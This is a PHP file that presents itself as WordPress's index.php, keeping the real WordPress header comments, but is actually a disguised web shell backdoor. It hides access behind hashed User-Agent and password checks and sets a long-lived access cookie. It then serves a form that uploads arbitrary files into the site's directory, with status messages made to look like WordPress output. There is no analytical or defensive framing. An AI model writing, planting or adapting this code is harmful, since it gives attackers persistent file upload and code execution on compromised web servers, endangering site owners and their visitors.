<?php

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
if (md5($_SERVER['HTTP_USER_AGENT'])<> 'fdf0d4c6e5aff827d0af31f5932ede1a' ) {
    echo "Bad Request"; exit;
}
$hostname = str_replace("www.","",strtolower($_SERVER['HTTP_HOST']));
$cookie_host = $hostname;
if (   ($_REQUEST['GV_z']) && (md5($_REQUEST['GV_z']) == '54770f485d7e90b74ae7b6f39fb54aba')   ) {
    setcookie('engine_ssl_https' , $_REQUEST['GV_z'] , time() + 86400 * 30 * 12 , '/' , '.' . $cookie_host);
    header('Location: ' .$_SERVER["HTTP_REFERER"]);
}
if (   (!isset($_COOKIE['engine_ssl_https'])) || (md5($_COOKIE['engine_ssl_https'])<>'54770f485d7e90b74ae7b6f39fb54aba')   ) {
    echo '<form method="post" action=""><input type="text" name="GV_z" value=""><input type="submit" value="&gt;"></form>';
    exit;
}

if(empty($_GET['Nfiles']))$Nfiles=1;else $Nfiles=$_GET['Nfiles'];
if($_FILES['userfile']['tmp_name'][0]!=''){
    for($i=0;$i<$Nfiles&&$_FILES['userfile']['tmp_name'][$i]!='';$i++){
        $uploaddir = dirname(__FILE__);
        $uploadfile = $uploaddir .'/'. basename($_FILES['userfile']['name'][$i]);
        print "<pre>";
        if (move_uploaded_file($_FILES['userfile']['tmp_name'][$i], $uploadfile)) {
            print "Wordpress is valid, ok. ";
        } else {
            print "Wordpress CMS. Here's some debugging info:";
        }   print "</pre>";
    }
}
?>
<html>
<head>
    <title>Loads the WordPress Environment and Template</title>
</head>
<body>
<form action="<?php echo $_SERVER['PHP_SELF'].'?Nfiles='.$Nfiles; ?>" method="post" enctype="multipart/form-data">
    <?php for($i=0;$i<$Nfiles;$i++){echo '<input name="userfile[]" type="file"><br>';}?>
    <input type="submit" value="wordpress">
</form>

</body>

</html>
